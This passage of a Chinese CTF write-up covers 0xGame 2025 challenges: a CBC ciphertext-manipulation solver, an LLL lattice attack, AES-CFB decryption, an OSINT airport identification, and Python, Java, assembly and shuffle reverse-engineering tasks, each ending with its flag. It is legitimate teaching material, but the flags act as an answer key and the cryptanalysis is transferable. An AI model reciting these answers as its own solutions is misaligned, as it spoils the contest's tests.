class="built_in">print</span>(<span class="string">&quot;(Or type &#x27;manual&#x27; to calculate manually)&quot;</span>)</span><br><span class="line"></span><br><span class="line"><span class="keyword">try</span>:</span><br><span class="line">    ct1 = <span class="built_in">input</span>().strip()</span><br><span class="line">    <span class="keyword">if</span> ct1.lower() != <span class="string">&#x27;manual&#x27;</span> <span class="keyword">and</span> ct1:</span><br><span class="line">        ct1_bytes = b64decode(ct1)</span><br><span class="line">        C1 = ct1_bytes[:<span class="number">16</span>]</span><br><span class="line">        C2 = ct1_bytes[<span class="number">16</span>:<span class="number">32</span>]</span><br><span class="line">        </span><br><span class="line">        <span class="built_in">print</span>(<span class="string">f&quot;\nC1: <span class="subst">&#123;C1.<span class="built_in">hex</span>()&#125;</span>&quot;</span>)</span><br><span class="line">        <span class="built_in">print</span>(<span class="string">f&quot;C2 (this is B): <span class="subst">&#123;C2.<span class="built_in">hex</span>()&#125;</span>&quot;</span>)</span><br><span class="line">        </span><br><span class="line">        <span class="comment"># Calculate correct P3 for C-B-C</span></span><br><span class="line">        P3 = xor_bytes(xor_bytes(P1, IV), C2)</span><br><span class="line">        plaintext_cbc = P1 + P2 + P3</span><br><span class="line">        <span class="built_in">print</span>(<span class="string">f&quot;\n=== C-B-C Plaintext (base64) ===&quot;</span>)</span><br><span class="line">        <span class="built_in">print</span>(b64encode(plaintext_cbc).decode())</span><br><span class="line">        </span><br><span class="line">        <span class="comment"># Calculate P2&#x27; for C-C-B</span></span><br><span class="line">        P2_prime = xor_bytes(xor_bytes(P1, IV), C1)</span><br><span class="line">        plaintext_ccb = P1 + P2_prime + P2</span><br><span class="line">        <span class="built_in">print</span>(<span class="string">f&quot;\n=== C-C-B Plaintext (base64) ===&quot;</span>)</span><br><span class="line">        <span class="built_in">print</span>(b64encode(plaintext_ccb).decode())</span><br><span class="line">        </span><br><span class="line">        <span class="built_in">print</span>(<span class="string">&quot;\nUse these plaintexts in order when prompted for option 2!&quot;</span>)</span><br><span class="line">    <span class="keyword">else</span>:</span><br><span class="line">        <span class="built_in">print</span>(<span class="string">&quot;\nManual calculation formulas:&quot;</span>)</span><br><span class="line">        <span class="built_in">print</span>(<span class="string">&quot;Given C1||C2||C3 from temporary encryption:&quot;</span>)</span><br><span class="line">        <span class="built_in">print</span>(<span class="string">&quot;P3_correct = P1 ⊕ IV ⊕ C2&quot;</span>)</span><br><span class="line">        <span class="built_in">print</span>(<span class="string">&quot;P2&#x27; = P1 ⊕ IV ⊕ C1&quot;</span>)</span><br><span class="line">        <span class="built_in">print</span>(<span class="string">&quot;\nC-B-C plaintext: P1 || P2 || P3_correct&quot;</span>)</span><br><span class="line">        <span class="built_in">print</span>(<span class="string">&quot;C-C-B plaintext: P1 || P2&#x27; || P2&quot;</span>)</span><br><span class="line"><span class="keyword">except</span>:</span><br><span class="line">    <span class="built_in">print</span>(<span class="string">&quot;\nUse the formulas above to calculate manually&quot;</span>)</span><br></pre></td></tr></table></figure>

<p>运行上述脚本，它会告诉你应该怎么做，首先选项1把<code>AAAAAAAAAAAAAAAAAAAAAP////////////////////8AAAAAAAAAAAAAAAAAAAAA==</code>这个粘进去，注意是base64编码的，所以记得结尾要有<code>==</code>,没有记得补上。然后服务器会返回给你加密的内容，粘进脚本里，<code>Ug7WsyG0J3FNWii4QRq2HQBI5mgU27sArYBi5lVTcR06+3+4x5Tdy5Ec9yMH2Xva</code>,然后它会给你解出cbc：<code>AAAAAAAAAAAAAAAAAAAAAP////////////////////8yAtWc9JDrDqkBCH3vRPBv</code>和ccb：<code>AAAAAAAAAAAAAAAAAAAAAGBE5UfB/3d/SdtCI/sNN2//////////////////////</code>,从而得到flag：<code> 0xGame&#123;fdc902c6-873a-4d92-b366-b6e83bde39f7&#125;</code>.</p>
<h2 id="格"><a href="#格" class="headerlink" title="格"></a>格</h2><p>解格：</p>
<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment"># SageMath 代码 (最终版)</span></span><br><span class="line"></span><br><span class="line"><span class="comment"># 1. 这是你从程序输出中提供的矩阵</span></span><br><span class="line">matrix_data = [</span><br><span class="line">    [<span class="number">3284681750909390818306909313921642175535822995982583393933696966300433498618099</span>, <span class="number">7062920994008607414635543198964747262695143293079919687270285360471612225464116</span>, <span class="number">9826330432780730699882966183005563282601785988437488502794820428794464309726364</span>, <span class="number">10313939243981504072492843197821189873801981624046806578030558315476228320733359</span>],</span><br><span class="line">    [<span class="number">14962120076283198553291772690327243603574931151327631953834236409697046371251172</span>, <span class="number">10914614871335511269514555072571377171094477247162595307427654861209446389077850</span>, <span class="number">13813513556033584840229315973248340868169094377335326963200609716900171410846991</span>, <span class="number">17767016205042422794681474520318417767408504251129953471000646286235093083687535</span>],</span><br><span class="line">    [<span class="number">15880849953718488589631767682500857705255547835146769369286551172642086223544654</span>, <span class="number">23536981063518946472925309088916542857554725764823718161707669971432320275459487</span>, <span class="number">26927812823530065718296292087211430992875944789365872721297497760084580766210537</span>, <span class="number">22230074134750723773334677934743831896859185125095203873930495218095676602198247</span>],</span><br><span class="line">    [<span class="number">14741023566046737527403024490343979553759831564949552088348125025359384680249250</span>, <span class="number">8837391869363988214859613817767621920507231139048698235441315423135328237787325</span>, <span class="number">9720795972355554118334542488724936259246227879278497862252939659284272861952841</span>, <span class="number">12075839868445672238363457714940958060191660916729079502656993881392627251511248</span>]</span><br><span class="line">]</span><br><span class="line"></span><br><span class="line">M = matrix(ZZ, matrix_data)</span><br><span class="line"></span><br><span class="line"><span class="comment"># 2. 应用 LLL 算法. &#x27;B&#x27; 将是一个完整的 4x4 矩阵.</span></span><br><span class="line">B = M.LLL()</span><br><span class="line"></span><br><span class="line"><span class="built_in">print</span>(<span class="string">&quot;[+] LLL 规约后的基 (完整的 B 矩阵):&quot;</span>)</span><br><span class="line"><span class="built_in">print</span>(B)</span><br><span class="line"></span><br><span class="line">found_secret = <span class="literal">False</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">recover_secret</span>(<span class="params">vector, vector_name</span>):</span><br><span class="line">    <span class="keyword">global</span> found_secret</span><br><span class="line">    <span class="keyword">if</span> found_secret: <span class="keyword">return</span></span><br><span class="line"></span><br><span class="line">    <span class="built_in">print</span>(<span class="string">f&quot;\n--- 正在检查向量: <span class="subst">&#123;vector_name&#125;</span> ---&quot;</span>)</span><br><span class="line">    <span class="keyword">for</span> direction <span class="keyword">in</span> [<span class="number">1</span>, -<span class="number">1</span>]:</span><br><span class="line">        v_cand = vector * direction</span><br><span class="line">        <span class="keyword">if</span> v_cand.is_zero(): <span class="keyword">continue</span></span><br><span class="line"></span><br><span class="line">        first_nonzero_val = <span class="built_in">next</span>((val <span class="keyword">for</span> val <span class="keyword">in</span> v_cand <span class="keyword">if</span> val != <span class="number">0</span>), <span class="literal">None</span>)</span><br><span class="line">        <span class="keyword">for</span> byte_val <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">1</span>, <span class="number">256</span>):</span><br><span class="line">            <span class="keyword">if</span> first_nonzero_val % byte_val == <span class="number">0</span>:</span><br><span class="line">                k = first_nonzero_val // byte_val</span><br><span class="line">                <span class="keyword">if</span> k == <span class="number">0</span>: <span class="keyword">continue</span></span><br><span class="line">                s_cand = v_cand / k</span><br><span class="line">                <span class="keyword">if</span> <span class="built_in">all</span>(c.is_integer() <span class="keyword">and</span> <span class="number">0</span> &lt;= c &lt;= <span class="number">255</span> <span class="keyword">for</span> c <span class="keyword">in</span> s_cand):</span><br><span class="line">                    secret_bytes = <span class="built_in">bytes</span>([<span class="built_in">int</span>(c) <span class="keyword">for</span> c <span class="keyword">in</span> s_cand])</span><br><span class="line">                    <span class="built_in">print</span>(<span class="string">f&quot;[+] 成功! 在 &#x27;<span class="subst">&#123;vector_name&#125;</span>&#x27; 中找到可能的 secret&quot;</span>)</span><br><span class="line">                    <span class="built_in">print</span>(<span class="string">f&quot;[-] secret: <span class="subst">&#123;secret_bytes.<span class="built_in">hex</span>()&#125;</span>&quot;</span>)</span><br><span class="line">                    found_secret = <span class="literal">True</span></span><br><span class="line">                    <span class="keyword">return</span></span><br><span class="line"></span><br><span class="line"><span class="comment"># 3. 检查基向量及其简单组合</span></span><br><span class="line">candidates = &#123;</span><br><span class="line">    <span class="string">&quot;B[0]&quot;</span>: B[<span class="number">0</span>], <span class="string">&quot;B[1]&quot;</span>: B[<span class="number">1</span>],</span><br><span class="line">    <span class="string">&quot;B[0] + B[1]&quot;</span>: B[<span class="number">0</span>] + B[<span class="number">1</span>], <span class="string">&quot;B[0] - B[1]&quot;</span>: B[<span class="number">0</span>] - B[<span class="number">1</span>],</span><br><span class="line">    <span class="string">&quot;B[2]&quot;</span>: B[<span class="number">2</span>], <span class="string">&quot;B[3]&quot;</span>: B[<span class="number">3</span>]</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="keyword">for</span> name, vec <span class="keyword">in</span> candidates.items():</span><br><span class="line">    <span class="keyword">if</span> found_secret: <span class="keyword">break</span></span><br><span class="line">    recover_secret(vec, name)</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> <span class="keyword">not</span> found_secret:</span><br><span class="line">    <span class="built_in">print</span>(<span class="string">&quot;\n[!] 未能恢复 secret. 问题可能比预想的更复杂.&quot;</span>)</span><br></pre></td></tr></table></figure>



<p>解密flag：</p>
<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> Crypto.Cipher <span class="keyword">import</span> AES</span><br><span class="line"><span class="keyword">from</span> Crypto.Util.Padding <span class="keyword">import</span> unpad</span><br><span class="line"></span><br><span class="line"><span class="comment"># 1. PEGA AQUÍ EL TEXTO CIFRADO COMPLETO DE 160 CARACTERES.</span></span><br><span class="line"><span class="comment">#    El que proporcionaste tiene 156 caracteres (78 bytes), le faltan 4 caracteres (2 bytes) al final.</span></span><br><span class="line"><span class="comment">#    Asegúrate de copiarlo entero.</span></span><br><span class="line">hex_ciphertext = <span class="string">&quot;83c9b4db1e036eada862d24928ae12641f7e56f713598661600da434cf3bc3e74429cbb807173626516dd030d964ad1f06ef2f9da03722943ba57653c4e0733b8474d57d450b01a331b1bd7ea36dcc4b&quot;</span> <span class="comment"># &lt;--- ¡REEMPLAZA ESTO CON EL VALOR COMPLETO!</span></span><br><span class="line"></span><br><span class="line"><span class="comment"># 2. La clave fija del programa.</span></span><br><span class="line">key = <span class="string">b&#x27;0xGame2025awaQAQ&#x27;</span></span><br><span class="line">block_size = AES.block_size  <span class="comment"># 16 bytes</span></span><br><span class="line"></span><br><span class="line"><span class="comment"># --- Script de Desencriptación Correcto ---</span></span><br><span class="line"><span class="keyword">try</span>:</span><br><span class="line">    full_ciphertext = <span class="built_in">bytes</span>.fromhex(hex_ciphertext)</span><br><span class="line">    </span><br><span class="line">    <span class="comment"># Comprobación de la longitud</span></span><br><span class="line">    <span class="keyword">if</span> <span class="built_in">len</span>(full_ciphertext) % block_size != <span class="number">0</span>:</span><br><span class="line">        <span class="built_in">print</span>(<span class="string">f&quot;[!] ADVERTENCIA: La longitud del texto cifrado (<span class="subst">&#123;<span class="built_in">len</span>(full_ciphertext)&#125;</span> bytes) no es un múltiplo de 16.&quot;</span>)</span><br><span class="line">        <span class="built_in">print</span>(<span class="string">&quot;[!] Esto indica que el texto cifrado está incompleto. El resultado será incorrecto.&quot;</span>)</span><br><span class="line"></span><br><span class="line">    <span class="keyword">if</span> <span class="built_in">len</span>(full_ciphertext) &lt; block_size:</span><br><span class="line">        <span class="keyword">raise</span> ValueError(<span class="string">&quot;El texto cifrado es demasiado corto.&quot;</span>)</span><br><span class="line"></span><br><span class="line">    <span class="comment"># El primer bloque del texto cifrado (C_1) actúa como el IV para descifrar el resto del mensaje.</span></span><br><span class="line">    iv_for_decryption = full_ciphertext[<span class="number">0</span>:block_size]</span><br><span class="line"></span><br><span class="line">    <span class="comment"># El texto cifrado que queremos descifrar es todo lo que sigue al primer bloque (C_2, C_3, ...).</span></span><br><span class="line">    ciphertext_to_decrypt = full_ciphertext[block_size:]</span><br><span class="line">    </span><br><span class="line">    <span class="comment"># Crear un nuevo cifrador CFB usando C_1 como IV.</span></span><br><span class="line">    cipher = AES.new(key, AES.MODE_CFB, iv=iv_for_decryption)</span><br><span class="line">    </span><br><span class="line">    <span class="comment"># Descifrar para obtener (padded_flag + urandom_final).</span></span><br><span class="line">    decrypted_payload = cipher.decrypt(ciphertext_to_decrypt)</span><br><span class="line">    </span><br><span class="line">    <span class="built_in">print</span>(<span class="string">f&quot;[+] Contenido descifrado: <span class="subst">&#123;decrypted_payload&#125;</span>&quot;</span>)</span><br><span class="line"></span><br><span class="line">    <span class="comment"># El mensaje original era: padded_flag(48 bytes) + urandom(16 bytes).</span></span><br><span class="line">    <span class="comment"># Por lo tanto, el contenido descifrado debería tener 64 bytes.</span></span><br><span class="line">    <span class="keyword">if</span> <span class="built_in">len</span>(decrypted_payload) &lt; <span class="number">48</span>: <span class="comment"># Necesitamos al menos los 48 bytes de la flag.</span></span><br><span class="line">         <span class="keyword">raise</span> ValueError(<span class="string">&quot;El contenido descifrado es demasiado corto para contener la flag.&quot;</span>)</span><br><span class="line"></span><br><span class="line">    <span class="comment"># Aislamos los bloques que deberían contener la flag con padding (los primeros 48 bytes del payload).</span></span><br><span class="line">    padded_flag = decrypted_payload[:<span class="number">48</span>]</span><br><span class="line"></span><br><span class="line">    <span class="comment"># Intentar quitar el padding de la parte de la flag.</span></span><br><span class="line">    flag = unpad(padded_flag, block_size)</span><br><span class="line">    </span><br><span class="line">    flag_str = flag.decode()</span><br><span class="line">    </span><br><span class="line">    <span class="keyword">if</span> flag_str.startswith(<span class="string">&quot;0xGame&#123;&quot;</span>) <span class="keyword">and</span> flag_str.endswith(<span class="string">&quot;&#125;&quot;</span>):</span><br><span class="line">        <span class="built_in">print</span>(<span class="string">&quot;\n&quot;</span> + <span class="string">&quot;=&quot;</span>*<span class="number">40</span>)</span><br><span class="line">        <span class="built_in">print</span>(<span class="string">f&quot;[+] ¡ÉXITO! La flag es: <span class="subst">&#123;flag_str&#125;</span>&quot;</span>)</span><br><span class="line">        <span class="built_in">print</span>(<span class="string">&quot;=&quot;</span>*<span class="number">40</span>)</span><br><span class="line">    <span class="keyword">else</span>:</span><br><span class="line">        <span class="built_in">print</span>(<span class="string">&quot;\n[!] Se descifró un texto, pero no parece tener el formato de la flag.&quot;</span>)</span><br><span class="line">        <span class="built_in">print</span>(<span class="string">f&quot;[!] Texto obtenido: <span class="subst">&#123;flag_str&#125;</span>&quot;</span>)</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="keyword">except</span> (ValueError, IndexError) <span class="keyword">as</span> e:</span><br><span class="line">    <span class="built_in">print</span>(<span class="string">f&quot;\n[!] ERROR: No se pudo descifrar la flag. Causa probable: <span class="subst">&#123;e&#125;</span>&quot;</span>)</span><br><span class="line">    <span class="built_in">print</span>(<span class="string">&quot;[!] Por favor, comprueba que has copiado el texto cifrado completo (160 caracteres hexadecimales).&quot;</span>)</span><br><span class="line"><span class="keyword">except</span> Exception <span class="keyword">as</span> e:</span><br><span class="line">    <span class="built_in">print</span>(<span class="string">f&quot;\n[!] Ocurrió un error inesperado: <span class="subst">&#123;e&#125;</span>&quot;</span>)</span><br></pre></td></tr></table></figure>

<p>得到flag：<code>0xGame&#123;5adccb16-92b6-4d44-89dd-c1e39f6c9338&#125;</code></p>
<h1 id="Osint"><a href="#Osint" class="headerlink" title="Osint"></a>Osint</h1><h2 id="机场"><a href="#机场" class="headerlink" title="机场"></a>机场</h2><p>根据橙黄色廊桥和西藏航空的飞机(Tibet Airlines)可以确定是<code>珠海金湾机场</code>，三字码是ZUH，注意这个是大写，然后用网站上的加密工具进行32位小写md5加密，得到<code>296d0dd1964288715beb8e2d06dca1a5</code>,就得到flag了。</p>
<h1 id="Reverse"><a href="#Reverse" class="headerlink" title="Reverse"></a>Reverse</h1><h2 id="baby-python逆向"><a href="#baby-python逆向" class="headerlink" title="baby_python逆向"></a>baby_python逆向</h2><ul>
<li><p>使用<code>pyinstxtractor</code>提取文件，运行<code>python pyinstxtractor.py babyPy.exe</code>，从.exe中提取.pyc文件(注意这个工具要和目标程序放在同一个目录下。)</p>
</li>
<li><p>使用<code>uncompyle6</code>反编译，<code>uncompyle6 babyPy.pyc &gt; decompiled_code.py</code>,然后就可以在<code>decompiled_code.py</code>这个脚本里找到flag了。</p>
</li>
<li><p><code>0xGame&#123;c2a6d59d-34dc-4b94-96aa-e823bdcb4823&#125;</code></p>
</li>
</ul>
<h2 id="baby-java逆向"><a href="#baby-java逆向" class="headerlink" title="baby_java逆向"></a>baby_java逆向</h2><ul>
<li><p><code>jar -tf BabyJar.jar</code>分析文件结构</p>
</li>
<li><pre><code class="language-python"># 提取所有 class 文件
jar -xf BabyJar.jar

# 使用 javap 查看字节码（基础信息）
javap -c com/BabyJar/demo/BabyJar.class
javap -c com/BabyJar/demo/Encrypt.class
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br></pre></td><td class="code"><pre><span class="line"></span><br><span class="line">​	查看类的基础信息。</span><br><span class="line"></span><br><span class="line">- 找到密文`QsY1V5cX9jJyF2JSAgdikwfCEneTAgICUpNnd1Iyk8IXUkJ3QhcyZ8J3YpY=`   和   加密过程`原始flag → 每个字节 XOR 20 → 交换高低4位 → Base64编码 → 比较`</span><br><span class="line"></span><br><span class="line">- 解密：`Base64解码 → 交换高低4位 → 每个字节 XOR 20 → 得到原始flag`</span><br><span class="line"></span><br><span class="line">- 完整exp：</span><br><span class="line"></span><br><span class="line">  ```python</span><br><span class="line">  import base64</span><br><span class="line">  </span><br><span class="line">  # 硬编码的密文</span><br><span class="line">  encoded = &quot;QsY1V5cX9jJyF2JSAgdikwfCEneTAgICUpNnd1Iyk8IXUkJ3QhcyZ8J3YpY=&quot;</span><br><span class="line">  </span><br><span class="line">  # Base64 解码</span><br><span class="line">  encrypted_bytes = base64.b64decode(encoded)</span><br><span class="line">  </span><br><span class="line">  # 逆向加密过程</span><br><span class="line">  def decrypt(data):</span><br><span class="line">      result = []</span><br><span class="line">      for byte in data:</span><br><span class="line">          # 1. 先交换高低4位（逆向第一步）</span><br><span class="line">          swapped = ((byte &amp; 0x0F) &lt;&lt; 4) | ((byte &amp; 0xF0) &gt;&gt; 4)</span><br><span class="line">          # 2. 再与 key=20 进行 XOR（逆向第二步）</span><br><span class="line">          decrypted = swapped ^ 20</span><br><span class="line">          result.append(decrypted)</span><br><span class="line">      return bytes(result)</span><br><span class="line">  </span><br><span class="line">  # 解密</span><br><span class="line">  decrypted = decrypt(encrypted_bytes)</span><br><span class="line">  flag = decrypted.decode(&#x27;utf-8&#x27;)</span><br><span class="line">  print(f&quot;Flag: &#123;flag&#125;&quot;)</span><br></pre></td></tr></table></figure>

得到flag：`0xGame&#123;73e214d2-d85c-4441-bc17-8e10c0e7b8c2&#125;`.
</code></pre>
</li>
</ul>
<h2 id="16位程序与asm汇编"><a href="#16位程序与asm汇编" class="headerlink" title="16位程序与asm汇编"></a>16位程序与asm汇编</h2><p>数据分两个循环两种加密。每23个字节为一段。</p>
<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment"># 完整加密数据</span></span><br><span class="line">encrypted = [</span><br><span class="line">    <span class="number">0x47</span>, <span class="number">0x7F</span>, <span class="number">0x52</span>, <span class="number">0x78</span>, <span class="number">0x6C</span>, <span class="number">0x74</span>, <span class="number">0x7E</span>, <span class="number">0x72</span>, <span class="number">0x47</span>, <span class="number">0x47</span>,</span><br><span class="line">    <span class="number">0x73</span>, <span class="number">0x5A</span>, <span class="number">0x84</span>, <span class="number">0x5A</span>, <span class="number">0x43</span>, <span class="number">0x85</span>, <span class="number">0x46</span>, <span class="number">0x5A</span>, <span class="number">0x83</span>, <span class="number">0x6F</span>,</span><br><span class="line">    <span class="number">0x46</span>, <span class="number">0x5A</span>, <span class="number">0x6C</span>,  <span class="comment"># 前23字节</span></span><br><span class="line">    <span class="number">0x33</span>, <span class="number">0x30</span>, <span class="number">0x73</span>, <span class="number">0x32</span>, <span class="number">0x75</span>, <span class="number">0x66</span>, <span class="number">0x37</span>, <span class="number">0x61</span>, <span class="number">0x66</span>, <span class="number">0x33</span>,</span><br><span class="line">    <span class="number">0x30</span>, <span class="number">0x78</span>, <span class="number">0x66</span>, <span class="number">0x40</span>, <span class="number">0x35</span>, <span class="number">0x61</span>, <span class="number">0x4E</span>, <span class="number">0x64</span>, <span class="number">0x34</span>, <span class="number">0x65</span>,</span><br><span class="line">    <span class="number">0x32</span>, <span class="number">0x33</span>, <span class="number">0x88</span>   <span class="comment"># 后23字节</span></span><br><span class="line">]</span><br><span class="line"></span><br><span class="line"><span class="comment"># 分开两部分</span></span><br><span class="line">part1 = encrypted[:<span class="number">23</span>]  <span class="comment"># 循环1处理</span></span><br><span class="line">part2 = encrypted[<span class="number">23</span>:]  <span class="comment"># 循环2处理</span></span><br><span class="line"></span><br><span class="line"><span class="comment"># 方法1：先sub 9再xor 0E (循环1)</span></span><br><span class="line">decrypted1 = <span class="string">&quot;&quot;</span></span><br><span class="line"><span class="keyword">for</span> byte <span class="keyword">in</span> part1:</span><br><span class="line">    decrypted1 += <span class="built_in">chr</span>(((byte - <span class="number">9</span>) &amp; <span class="number">0xFF</span>) ^ <span class="number">0x0E</span>)</span><br><span class="line"></span><br><span class="line"><span class="comment"># 方法2：先xor 0E再sub 9 (循环2)  </span></span><br><span class="line">decrypted2 = <span class="string">&quot;&quot;</span></span><br><span class="line"><span class="keyword">for</span> byte <span class="keyword">in</span> part2:</span><br><span class="line">    decrypted2 += <span class="built_in">chr</span>(((byte ^ <span class="number">0x0E</span>) - <span class="number">9</span>) &amp; <span class="number">0xFF</span>)</span><br><span class="line"></span><br><span class="line"><span class="built_in">print</span>(<span class="string">&quot;第一部分:&quot;</span>, decrypted1)</span><br><span class="line"><span class="built_in">print</span>(<span class="string">&quot;第二部分:&quot;</span>, decrypted2)</span><br><span class="line"><span class="built_in">print</span>(<span class="string">&quot;完整Flag:&quot;</span>, decrypted1 + decrypted2)</span><br></pre></td></tr></table></figure>

<p>逆向解密，得到：<code>0xGame&#123;g00d_u_4r3_th3_m45t3r_0f_45m_E2f7a1b34&#125;</code></p>
<p>很好，你是汇编大师🥰🥰。</p>
<h2 id="shuffle"><a href="#shuffle" class="headerlink" title="shuffle"></a>shuffle</h2><p>IDA里可以看到打乱的flag：<code>23-64bed6&#125;-xm5300-&#123;faGa34-0e04c2e7c2a78f39a4</code>,随机数种子1638，MSVC的标准C语言库生成的随机数，和打乱逻辑:</p>
<p><img src="/images/wp/shuffle.png" alt="shuffle"></p>
<p>编写逆向脚本：</p>
<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">for</span> idx <span class="keyword">in</span> <span class="built_in">range</span>(<span class="built_in">len</span>(operations) - <span class="number">1</span>, -<span class="number">1</span>, -<span class="number">1</span>):</span><br><span class="line">       i, swap_idx = operations[idx]</span><br><span class="line">       arr[i], arr[swap_idx] = arr[swap_idx], arr[i]</span><br><span class="line">   </span><br><span class="line">   <span class="keyword">return</span> <span class="string">&#x27;&#x27;</span>.join(arr)</span><br><span class="line"></span><br></pre></td></tr></table></figure>

<p>得到flag：<code>0xGame&#123;5ffa9030-e204-4673-b4c6-ed433aca7228&#125;</code></p>
<h2 id="TELF"><a href="#TELF" class="headerlink" title="TELF"></a>TELF</h2><p>010的使用:在光标处键入数据会<strong>自动往后覆盖</strong>，实现替换。(或者选中某块数据然后开始键入，修改替换掉该块的数据。)注意不要删除，删了之后再键入就是继续往后覆盖数据了。这就不能实现该数据块的替换了，反而替换掉了后面不该替换的数据。<strong>删除不要乱点！</strong></p>
<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> struct</span><br><span class="line"><span class="keyword">import</span> ctypes</span><br><span class="line"></span><br><span class="line">libc = ctypes.CDLL(<span class="string">&#x27;libc.so.6&#x27;</span>)  </span><br><span class="line"></span><br><span class="line"><span class="comment"># 定义 srand 和 rand 函数的原型</span></span><br><span class="line">libc.srand.argtypes = 